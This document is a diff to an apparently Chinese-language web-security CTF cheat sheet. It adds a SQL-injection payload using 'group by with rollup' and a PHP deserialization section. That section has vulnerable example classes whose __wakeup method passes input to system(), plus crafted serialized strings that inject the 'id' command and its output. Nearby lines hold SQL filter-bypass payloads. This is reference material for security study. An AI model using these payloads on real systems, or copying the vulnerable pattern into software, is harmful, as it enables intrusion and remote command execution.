@@ -396,6 +396,9 @@ cat $(ls)
     - `id=-1%09UNION%0DSELECT%0A1,2,3`
     - `id=(-1)UNION(SELECT(1),2,3)`
 
+- group by with rollup
+    - `' or 1=1 group by pwd with rollup limit 1 offset 2#`
+
 - 不使用逗號
     - `LIMIT N, M` => `LIMIT M OFFSET N`
     - `mid(user(), 1, 1)` => `mid(user() from 1 for 1)`
@@ -668,7 +671,7 @@ HQL injection example (pwn2win 2017)
         ?>
     - 構造 `?file=phar://phartest.zip/b.jpg`
 
-# 上傳
+# 上傳漏洞
 
 ## Javascript檢測
 
@@ -708,6 +711,99 @@ HQL injection example (pwn2win 2017)
     - `47 49 36 38 39 61`
 - png
     - `89 50 4E 47`
+
+# 反序列化
+
+## PHP - Serialize() / Unserialize()
+
+- `__construct()`
+    - Object被new時調用，但unserialize()不調用
+- `__destruct()`
+    - Object被銷毀時調用
+- `__wakeup()`
+    - unserialize時自動調用
+- `__sleep()`
+    - 被serialize時調用
+- `__toString()`
+    - 物件被當成字串時調用
+
+<br>
+
+- Value
+    - String
+        - `s:size:value;`
+    - Integer
+        - `i:value;`
+    - Boolean
+        - `b:value;` ('1' or '0')
+    - NULL
+        - `N;`
+    - Array
+        - `a:size:{key definition; value definition; (repeat per element)}`
+    - Object
+        - `O:strlen(class name):class name:object size:{s:strlen(property name):property name:property definition;(repeat per property)}`
+    - 其他
+        - C - custom object
+        - R - pointer reference
+
+
+- Public / Private / Protected 序列化
+例如：class名字為: `Kaibro`
+變數名字: `test`
+    - 若為Public，序列化後：
+        - `...{s:4:"test";...}`
+    - 若為Private，序列化後：
+        - `...{s:12:"%00Kaibro%00test"}`
+    - 若為Protected，序列化後：
+        - `...{s:7:"%00*%00test";...}`
+    - Private和Protected會多兩個NULL byte
+
+---
+
+- Example
+    
+```php
+    <?php
+
+    class Kaibro {
+        public $test = "ggininder";
+        function __wakeup()
+        {
+            system("echo ".$this->test);
+        }
+    }
+
+    $input = $_GET['str'];
+    $kb = unserialize($input);
+```
+
+- Input: `.php?str=O:6:"Kaibro":1:{s:4:"test";s:3:";id";}`
+- Output: `uid=33(www-data) gid=33(www-data) groups=33(www-data) `
+
+<br>
+
+- Example 2 - Private
+
+```php
+<?php
+
+class Kaibro {
+    private $test = "ggininder";
+    function __wakeup()
+    {
+        system("echo ".$this->test);
+    }
+}
+
+$input = $_GET['str'];
+$kb = unserialize($input);
+
+```
+
+- Input: `.php?str=O:6:"Kaibro":1:{s:12:"%00Kaibro%00test";s:3:";id";}`
+
+- Output: `uid=33(www-data) gid=33(www-data) groups=33(www-data)`
+
 
 # SSRF
 
@@ -915,7 +1011,7 @@ xxe.dtd:
 
 ## DoS
 
-- Bilion Laugh Attack
+- Billion Laugh Attack
 
 ```xml
 <!DOCTYPE data [
